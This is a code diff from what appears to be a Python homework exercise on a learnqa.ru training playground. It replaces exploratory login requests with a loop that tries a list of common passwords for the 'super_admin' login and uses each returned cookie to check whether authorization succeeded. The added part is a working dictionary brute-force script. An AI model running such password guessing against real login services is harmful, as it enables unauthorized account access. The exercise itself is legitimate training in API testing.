@@ -1,27 +1,27 @@
 import requests
 
 login = "super_admin"
-response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login" : "abc", "password" : "abcd"})
-print("неверный логин response: " + response.text)
-print("неверный логин response_code: " + str(response.status_code))
 
-response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"password" : "abcd"})
-print("без логина response1: " + response.text)
-print("без логина response_code1: " + str(response.status_code))
+passw = ["password",	"123456",	"123456789", "12345678", "12345",	"qwerty", "abc123",	"football",	"1234567", "monkey",
+"111111", "letmein", "1234", "1234567890", "dragon",	"baseball",	"sunshine",	"iloveyou", "trustno1", "princess",
+"adobe123",	"123123", "welcome",	"login",	"admin",	"qwerty123", "solo",	"1q2w3e4r",
+"master",	"666666",	"photoshop",	"1qaz2wsx",	"qwertyuiop",
+"ashley", "1234",	"mustang",	"121212"	"starwars",	"654321", "bailey",	"access", "flower",	"555555", "passw0rd",
+"shadow", "lovely", "sunshine", "7777777", "michael",	"!@#$%^&*",	"jesus",	"password1",	"superman",	"hello",
+"charlie",	"888888", "696969",	"qwertyuiop",	"hottie",	"freedom",	"aa123456",	"gazwsx",	"ninja",	"azerty",
+"loveme",	"whatever",	"donald",	"batman",	"zaq1zaq1",	"qazwsx",	"Football",	"000000",	"starwars",	"123qwe"]
 
-response2 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login" : f"{login}", "password" : "abcd"})
-print("верный логин response2: " + response2.text)
-print("верный логин response2: " + str(response2.status_code))
 
-# # c user-agent
-#
-# us_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36'
-# session = requests.get("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", params={"User-Agent": f"{us_agent}"})
-#
-# print("Get с юзер-агентом" + session.text)
-# print(session.status_code)
-#
-# response3 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login" : f"{login}", "password" : "abcd"})
-# print("верный логин после get response3: " + response3.text)
-# print("response3: " + str(response3.status_code))
+for v in passw:
+
+    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login" : f"{login}", "password" : f"{v}"})
+
+    cook = response1.cookies
+
+
+    response2 = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cook)
+    if response2.text != "You are NOT authorized":
+        print(f'Верный пароль: {v}, ' + response2.text)
+
+
 
